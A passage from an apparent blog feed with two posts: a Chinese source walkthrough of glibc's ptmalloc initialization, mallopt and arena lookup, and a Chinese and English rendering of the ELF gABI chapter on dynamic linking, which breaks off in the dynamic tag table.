<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">static void ptmalloc_init(void) &#123;</div><div class="line"></div><div class="line">    if (__malloc_initialized &gt;= 0)</div><div class="line">        return;</div><div class="line">    __malloc_initialized = 0;</div><div class="line"></div><div class="line">    tsd_key_create(&amp;arena_key, NULL);</div><div class="line">    tsd_setspecific(arena_key, (void *) &amp;main_arena);</div><div class="line">    thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2);</div><div class="line">    const char *s = NULL;</div><div class="line">    if (__glibc_likely(_environ != NULL)) &#123;</div><div class="line">        char **runp = _environ;</div><div class="line">        char *envline;</div><div class="line"></div><div class="line">        while (__builtin_expect((envline = next_env_entry(&amp;runp)) != NULL, 0)) &#123;</div><div class="line">            size_t len = strcspn(envline, &quot;=&quot;);</div><div class="line"></div><div class="line">            if (envline[len] != &apos;=&apos;)</div><div class="line">                continue;</div><div class="line"></div><div class="line">            switch (len) &#123;</div><div class="line">            case 6:</div><div class="line">                if (memcmp(envline, &quot;CHECK_&quot;, 6) == 0)</div><div class="line">                    s = &amp;envline[7];</div><div class="line">                break;</div><div class="line">            case 8:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TOP_PAD_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_TOP_PAD, atoi(&amp;envline[9]));</div><div class="line">                    else if (memcmp(envline, &quot;PERTURB_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_PERTURB, atoi(&amp;envline[9]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 9:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;MMAP_MAX_&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_MAX, atoi(&amp;envline[10]));</div><div class="line">                    else if (memcmp(envline, &quot;ARENA_MAX&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_MAX, atoi(&amp;envline[10]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 10:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;ARENA_TEST&quot;, 10) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_TEST, atoi(&amp;envline[11]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 15:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TRIM_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_TRIM_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                    else if (memcmp(envline, &quot;MMAP_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            default:</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (s &amp;&amp; s[0]) &#123;</div><div class="line">        __libc_mallopt(M_CHECK_ACTION, (int) (s[0] - &apos;0&apos;));</div><div class="line">        if (check_action != 0)</div><div class="line">            __malloc_check_init();</div><div class="line">    &#125;</div><div class="line">    void (*hook)(void) = atomic_forced_read (__malloc_initialize_hook);</div><div class="line">    if (hook != NULL)</div><div class="line">        (*hook)();</div><div class="line">    __malloc_initialized = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先检查全局变量<code>__malloc_initialized</code>是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果改值为0，表示ptmalloc正在初始化，全局变量<code>__malloc_initialized</code>用来保证全局只初始化ptmalloc一次。<br><code>tsd_key_create</code>创建线程私有实例<code>arena_key</code>，该私有实例保存的是分配区（arena）的<code>malloc_state</code>实例指针。<code>arena_key</code>指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用<code>ptmalloc_init()</code>的线程的<code>arena_key</code>绑定到主分配区上。意味着本线程首选从主分配区分配内存。arena_key在glibc中是一个线程私有变量，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define tsd_key_create(key, destr)  ((void) (key))</div><div class="line">#define tsd_setspecific(key, data)  __libc_tsd_set (void *, MALLOC, (data))</div><div class="line">#define __libc_tsd_set(TYPE, KEY, VALUE)    (__libc_tsd_##KEY = (VALUE))</div></pre></td></tr></table></figure>
<p><code>tsd_setspecific(arena_key, (void *) &amp;main_arena);</code>就是<code>__libc_tsd_MALLOC = &amp;main_arena</code><br>thread_atfork用来设置进程在fork创建子进程时关于锁设置的各个函数，<code>ptmalloc_lock_all</code>和<code>ptmalloc_unlock_all</code>用来给父进程加锁解锁，<code>ptmalloc_unlock_all2</code>用来给子进程调用以解锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># define thread_atfork(prepare, parent, child) \</div><div class="line">  atfork_mem.prepare_handler = prepare;                       \</div><div class="line">  atfork_mem.parent_handler = parent;                         \</div><div class="line">  atfork_mem.child_handler = child;                       \</div><div class="line">  atfork_mem.dso_handle = &amp;__dso_handle == NULL ? NULL : __dso_handle;        \</div><div class="line">  atfork_mem.refcntr = 1;                             \</div><div class="line">  __linkin_atfork (&amp;atfork_mem)</div></pre></td></tr></table></figure>
<p>其中，<code>atfork_mem</code>是一个全局的fork时的函数子针结构体fork_handler，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define ATFORK_MEM static struct fork_handler atfork_mem1</div></pre></td></tr></table></figure>
<p><code>__linkin_atfork</code>用于将刚刚构造的fork_handler添加进全局链表<code>__fork_handlers</code>中而不用加锁，其实就是一个CAS锁，关于该锁，可以查阅网上资料，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void attribute_hidden __linkin_atfork(struct fork_handler *newp) &#123;</div><div class="line">    do</div><div class="line">        newp-&gt;next = __fork_handlers;</div><div class="line">    while (catomic_compare_and_exchange_bool_acq(&amp;__fork_handlers, newp,</div><div class="line">            newp-&gt;next) != 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>catomic_compare_and_exchange_bool_acq</code>最后是一个宏定义，将之改写后如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    fork_handler* __atg4_old = newp-&gt;next;</div><div class="line">    long __gmemp = &amp;__fork_handlers;</div><div class="line">    ATOMIC();</div><div class="line">    fork_handler* __gret = *__gmemp;</div><div class="line">    fork_handler* __gnewval = newp;</div><div class="line">    if (__gret == __atg4_old)</div><div class="line">       *__gmemp = newp;</div><div class="line">    ENDATOMIC();</div><div class="line">    __gret;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>gcc会将这段代码进行编译，生成的代码无法被中断。因此简单说来，<code>__linkin_atfork</code>就是将<code>fork_handler</code>原子添加进全局链表<code>__fork_handlers</code>中。</p>
<p>回到ptmalloc_init函数中，接下来就是进行环境变量的设置，<code>__glibc_likely</code>和gcc的编译优化相关，不管他。<code>_environ</code>就是<code>__environ</code>，里面保存了环境变量，下面就是根据各个环境变量调用<code>__libc_mallopt</code>进行设置，后面来看这个函数。</p>
<p><code>ptmalloc_init</code>然后获取<code>__malloc_initialize_hook</code>函数指针并执行，由于该函数和malloc没有直接关系，这里不管它。最后将<code>__malloc_initialized</code>设置为1，表是初始化完成。</p>
<h2 id="libc-mallopt"><a href="#libc-mallopt" class="headerlink" title="__libc_mallopt"></a>__libc_mallopt</h2><p><code>__libc_mallopt</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">int __libc_mallopt(int param_number, int value) &#123;</div><div class="line">    mstate av = &amp;main_arena;</div><div class="line">    int res = 1;</div><div class="line"></div><div class="line">    if (__malloc_initialized &lt; 0)</div><div class="line">        ptmalloc_init();</div><div class="line">    (void) mutex_lock(&amp;av-&gt;mutex);</div><div class="line">    malloc_consolidate(av);</div><div class="line"></div><div class="line">    LIBC_PROBE (memory_mallopt, 2, param_number, value);</div><div class="line"></div><div class="line">    switch (param_number) &#123;</div><div class="line">    case M_MXFAST:</div><div class="line">        if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());</div><div class="line">            set_max_fast(value);</div><div class="line">        &#125; else</div><div class="line">            res = 0;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TRIM_THRESHOLD:</div><div class="line">        LIBC_PROBE (memory_mallopt_trim_threshold, 3, value,</div><div class="line">                mp_.trim_threshold, mp_.no_dyn_threshold);</div><div class="line">        mp_.trim_threshold = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TOP_PAD:</div><div class="line">        LIBC_PROBE (memory_mallopt_top_pad, 3, value,</div><div class="line">                mp_.top_pad, mp_.no_dyn_threshold);</div><div class="line">        mp_.top_pad = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_THRESHOLD:</div><div class="line">        if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2)</div><div class="line">            res = 0;</div><div class="line">        else &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value,</div><div class="line">                    mp_.mmap_threshold, mp_.no_dyn_threshold);</div><div class="line">            mp_.mmap_threshold = value;</div><div class="line">            mp_.no_dyn_threshold = 1;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_MAX:</div><div class="line">        LIBC_PROBE (memory_mallopt_mmap_max, 3, value,</div><div class="line">                mp_.n_mmaps_max, mp_.no_dyn_threshold);</div><div class="line">        mp_.n_mmaps_max = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_CHECK_ACTION:</div><div class="line">        LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action);</div><div class="line">        check_action = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_PERTURB:</div><div class="line">        LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte);</div><div class="line">        perturb_byte = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_TEST:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test);</div><div class="line">            mp_.arena_test = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_MAX:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max);</div><div class="line">            mp_.arena_max = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">    (void) mutex_unlock(&amp;av-&gt;mutex);</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">libc_hidden_def( __libc_mallopt)</div></pre></td></tr></table></figure>
<p>首先通过<code>__malloc_initialized</code>判断如果ptmalloc还未初始化，就调用<code>ptmalloc_init</code>进行初始化。<code>malloc_consolidate</code>用来将fast bins中的chunk合并，并且里面会初始化主分配区，后面的章节会分析到这个函数。然后就根据传入的<code>param_number</code>设置<code>mp_</code>，<code>mp_</code>代表ptmalloc的各个全局参数，其默认定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">static struct malloc_par mp_ = &#123; </div><div class="line">    .top_pad = DEFAULT_TOP_PAD, </div><div class="line">    .n_mmaps_max = DEFAULT_MMAP_MAX, </div><div class="line">    .mmap_threshold = DEFAULT_MMAP_THRESHOLD, </div><div class="line">    .trim_threshold = DEFAULT_TRIM_THRESHOLD,</div><div class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</div><div class="line">    .arena_test = NARENAS_FROM_NCORES(1) </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里不分析里面各个参数的意义，到后面用到时再来分析。<code>malloc_hook_ini</code>最后会回调<code>__libc_malloc</code>函数，这次<code>__malloc_hook</code>为null，因此继续看下面的代码。</p>
<h2 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h2><p>接下来通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在arena.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_get(ptr, size) do &#123; \</div><div class="line">      arena_lookup (ptr);                             \</div><div class="line">      arena_lock (ptr, size);                             \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>arena_lookup</code>从私有变量里获取分配区指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_lookup(ptr) do &#123; \</div><div class="line">      void *vptr = NULL;                              \</div><div class="line">      ptr = (mstate) tsd_getspecific (arena_key, vptr);               \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>tsd_getspecific</code>也是个宏定义，就是获取前面调用<code>tsd_setspecific</code>设置的分配区指针，这里取出的可能是主分配去指针，也可能是非主分配去指针，然后调用<code>arena_lock</code>对<code>malloc_state</code>中的<code>mutex</code>加锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define arena_lock(ptr, size) do &#123;                        \</div><div class="line">      if (ptr &amp;&amp; !arena_is_corrupt (ptr))                     \</div><div class="line">        (void) mutex_lock (&amp;ptr-&gt;mutex);                      \</div><div class="line">      else                                    \</div><div class="line">        ptr = arena_get2 (ptr, (size), NULL);                     \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p>获得分配去的指针后，就会调用<code>_int_malloc</code>开始分配内存了，下一章分析这个函数。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Dynamic Linking]]></title>
      <url>/2018/04/20/Dynamic-Linking/</url>
      <content type="html"><![CDATA[<h3 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h3><p><a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html" target="_blank" rel="external">http://www.sco.com/developers/gabi/latest/ch5.dynamic.html</a></p>
<h3 id="程序解释器（Program-Interpreter）"><a href="#程序解释器（Program-Interpreter）" class="headerlink" title="程序解释器（Program Interpreter）"></a>程序解释器（Program Interpreter）</h3><p>可执行程序在动态链接的过程中会有 <code>PT_INTERP</code> 程序段。exec(BA_OS)过程中，系统通过<code>PT_INTERP</code>获取路径名并且创建最初的解释器解释的文件段镜像。这就是说，程序不使用可执行文件原始的段镜像，而是另外创建一块内存给解释器。然后，解释器获得程序的控制权并提供相应的运行环境。</p>
<p>解释器获得控制权有两种方式：</p>
<ol>
<li>利用文件描述符去读取或者映射可执行文件的段到内存中。</li>
<li>系统依赖可执行文件的格式，加载可执行文件到内存</li>
</ol>
<p>由于文件描述符可能存在异常，因此解释器的初始进程状态需要与可执行文件接收的内容相匹配。 解释器可以不需要另外的解释器来解释，也即可以自解释；解释器可以是共享对象或可执行文件。</p>
<ul>
<li>共享对象：正常情况下是位置独立加载的，地址可能因进程而异; 系统会在mmap(KE_OS)和相关服务使用的动态段区域中创建段。因此，共享对象解释器通常不会与原始可执行文件的原始段地址冲突。</li>
<li>可执行文件：可能加载在固定地址处; 如果是这样，系统将使用程序头表中的虚拟地址创建其段。 因此，可执行文件解释器的虚拟地址可能与第一个可执行文件发生冲突; 解释器需要负责解决冲突。</li>
</ul>
<h3 id="动态链接器（Dynamic-Linker）"><a href="#动态链接器（Dynamic-Linker）" class="headerlink" title="动态链接器（Dynamic Linker）"></a>动态链接器（Dynamic Linker）</h3><p>当动态链接编译可执行文件，链接器将会在程序头加入<code>PT_INTERP</code>，以告诉系统用动态链接器作为程序解释器。</p>
<p><em>提供动态连接器的系统位置是特定于处理器的。</em></p>
<p>exec(BA_OS)和动态链接共同创建了程序的过程映像，过程如下：</p>
<ul>
<li>将可执行文件的内存段加入过程映像</li>
<li>将共享对象的内存段加入过程映像</li>
<li>对可执行文件及其共享对象执行重定向</li>
<li>如果文件描述符被交给动态链接器，就关闭用于读取可执行文件的文件描述符</li>
</ul>
<h3 id="Program-Interpreter"><a href="#Program-Interpreter" class="headerlink" title="Program Interpreter"></a>Program Interpreter</h3><p>An executable file that participates in dynamic linking shall have one <code>PT_INTERP</code> program header element. During <code>exec</code>(BA_OS), the system retrieves a path name from the <code>PT_INTERP</code> segment and creates the initial process image from the interpreter file&#39;s segments. That is, instead of using the original executable file&#39;s segment images, the system composes a memory image for the interpreter. It then is the interpreter&#39;s responsibility to receive control from the system and provide an environment for the application program.</p>
<p>As &#39;&#39;Process Initialization&#39;&#39; in Chapter 3 of the processor supplement mentions, the interpreter receives control in one of two ways. First, it may receive a file descriptor to read the executable file, positioned at the beginning. It can use this file descriptor to read and/or map the executable file&#39;s segments into memory. Second, depending on the executable file format, the system may load the executable file into memory instead of giving the interpreter an open file descriptor. With the possible exception of the file descriptor, the interpreter&#39;s initial process state matches what the executable file would have received. The interpreter itself may not require a second interpreter. An interpreter may be either a shared object or an executable file.</p>
<ul>
<li>A shared object (the normal case) is loaded as position-independent, with addresses that may vary from one process to another; the system creates its segments in the dynamic segment area used by mmap(KE_OS) and related services [See <code></code>Virtual Address Space&#39;&#39; in Chapter 3 of the processor supplement]. Consequently, a shared object interpreter typically will not conflict with the original executable file&#39;s original segment addresses.</li>
<li>An executable file may be loaded at fixed addresses; if so, the system creates its segments using the virtual addresses from the program header table. Consequently, an executable file interpreter&#39;s virtual addresses may collide with the first executable file; the interpreter is responsible for resolving conflicts.</li>
</ul>
<h3 id="Dynamic-Linker"><a href="#Dynamic-Linker" class="headerlink" title="Dynamic Linker"></a>Dynamic Linker</h3><p>When building an executable file that uses dynamic linking, the link editor adds a program header element of type <code>PT_INTERP</code>  to an executable file, telling the system to invoke the dynamic linker as the program interpreter.</p>
<hr>
<p> The locations of the system provided dynamic linkers are processor specific.</p>
<hr>
<p><code>Exec</code>(BA_OS) and the dynamic linker cooperate to create the process image for the program, which entails the following actions:</p>
<ul>
<li>Adding the executable file&#39;s memory segments to the process image;</li>
<li>Adding shared object memory segments to the process image;</li>
<li>Performing relocations for the executable file and its shared objects;</li>
<li>Closing the file descriptor that was used to read the executable file, if one was given to the dynamic linker;</li>
<li>Transferring control to the program, making it look as if the program had received control directly from<code>exec</code>(BA_OS).</li>
</ul>
<p>The link editor also constructs various data that assist the dynamic linker for executable and shared object files. As shown above in <a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html" target="_blank" rel="external">&#39;&#39;&#39;Program Header&#39;&#39;</a>, this data resides in loadable segments, making them available during execution. (Once again, recall the exact segment contents are processor-specific. See the processor supplement for complete information).</p>
<ul>
<li>A <code>.dynamic</code>section with type <code>SHT_DYNAMIC</code>holds various data. The structure residing at the beginning of the section holds the addresses of other dynamic linking information.</li>
<li>The <code>.hash</code>section with type <code>SHT_HASH</code>holds a symbol hash table.</li>
<li>The <code>.got</code> and <code>.plt</code> sections with type <code>SHT_PROGBITS</code> hold two separate tables: the global offset table and the procedure linkage table. Chapter 3 discusses how programs use the global offset table for position-independent code. Sections below explain how the dynamic linker uses and changes the tables to create memory images for object files.</li>
</ul>
<p>Because every ABI-conforming program imports the basic system services from a shared object library [See &#39;&#39;System Library&#39;&#39; in Chapter 6], the dynamic linker participates in every ABI-conforming program execution.</p>
<p>As &#39;&#39;Program Loading&#39;&#39; explains in the processor supplement, shared objects may occupy virtual memory addresses that are different from the addresses recorded in the file&#39;s program header table. The dynamic linker relocates the memory image, updating absolute addresses before the application gains control. Although the absolute address values would be correct if the library were loaded at the addresses specified in the program header table, this normally is not the case.</p>
<p>If the process environment [see <code>exec</code>(BA_OS)] contains a variable named <code>LD_BIND_NOW</code> with a non-null value, the dynamic linker processes all relocations before transferring control to the program. For example, all the following environment entries would specify this behavior.</p>
<ul>
<li>LD_BIND_NOW=1</li>
<li>LD_BIND_NOW=on</li>
<li>LD_BIND_NOW=off</li>
</ul>
<p>Otherwise, <code>LD_BIND_NOW</code> either does not occur in the environment or has a null value. The dynamic linker is permitted to evaluate procedure linkage table entries lazily, thus avoiding symbol resolution and relocation overhead for functions that are not called. See &#39;&#39;Procedure Linkage Table&#39;&#39; in this chapter of the processor supplement for more information.</p>
<h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p>If an object file participates in dynamic linking, its program header table will have an element of type<code>PT_DYNAMIC</code>. This &#39;&#39;segment&#39;&#39; contains the <code>.dynamic</code> section. A special symbol, <code>_DYNAMIC</code>, labels the section, which contains an array of the following structures.</p>
<hr>
<p>Figure 5-9: Dynamic Structure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef struct &#123;</div><div class="line">	Elf32_Sword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf32_Word	d_val;</div><div class="line">   		Elf32_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf32_Dyn;</div><div class="line"></div><div class="line">extern Elf32_Dyn	_DYNAMIC[];</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">	Elf64_Sxword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf64_Xword	d_val;</div><div class="line">   		Elf64_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf64_Dyn;</div><div class="line"></div><div class="line">extern Elf64_Dyn	_DYNAMIC[];</div></pre></td></tr></table></figure>
<hr>
<p>For each object with this type, <code>d_tag</code> controls the interpretation of <code>d_un</code>.</p>
<ul>
<li><p><code>d_val</code></p>
<p>These objects represent integer values with various interpretations.</p>
</li>
<li><p><code>d_ptr</code></p>
<p>These objects represent program virtual addresses. As mentioned previously, a file&#39;s virtual addresses might not match the memory virtual addresses during execution. When interpreting addresses contained in the dynamic structure, the dynamic linker computes actual addresses, based on the original file value and the memory base address. For consistency, files do <em>not</em> contain relocation  entries to &quot; correct&#39;&#39; addresses in the dynamic structure.   </p>
</li>
</ul>
<p>To make it simpler for tools to interpret the contents of dynamic section entries, the value of each tag, except for those in two special compatibility ranges, will determine the interpretation of the <code>d_un</code> union. A tag whose value is an even number indicates a dynamic section entry that uses <code>d_ptr</code>. <strong>A tag whose value is an odd number indicates a dynamic section entry that uses <code>d_val</code> or that uses neither <code>d_ptr</code> nor <code>d_val</code></strong>. Tags whose values are less than the special value <code>DT_ENCODING</code> and tags whose values fall between <code>DT_HIOS</code> and <code>DT_LOPROC</code> do not follow these rules.</p>
<p>The following table summarizes the tag requirements for executable and shared object files. If a tag is marked &quot;mandatory&#39;&#39;, the dynamic linking array for an ABI-conforming file must have an entry of that type. Likewise, &quot;optional&#39;&#39; means an entry for the tag may appear but is not required.</p>
<hr>
<p>Figure 5-10: Dynamic Array Tags <code>d_tag</code></p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><code>d_un</code></th>
<th><strong>Executable</strong></th>
<th><strong>Shared Object</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DT_NULL</code></td>
<td><code>0</code></td>
<td>ignored</td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_NEEDED</code></td>
<td><code>1</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTRELSZ</code></td>
<td><code>2</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTGOT</code></td>
<td><code>3</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_HASH</code></td>
<td><code>4</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_STRTAB</code></td>
<td><code>5</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMTAB</code></td>
<td><code>6</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_RELA</code></td>
<td><code>7</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELASZ</code></td>
<td><code>8</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELAENT</code></td>
<td><code>9</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_STRSZ</code></td>
<td><code>10</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMENT</code></td>
<td><code>11</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_INIT</code></td>
<td><code>12</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI</code></td>
<td><code>13</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
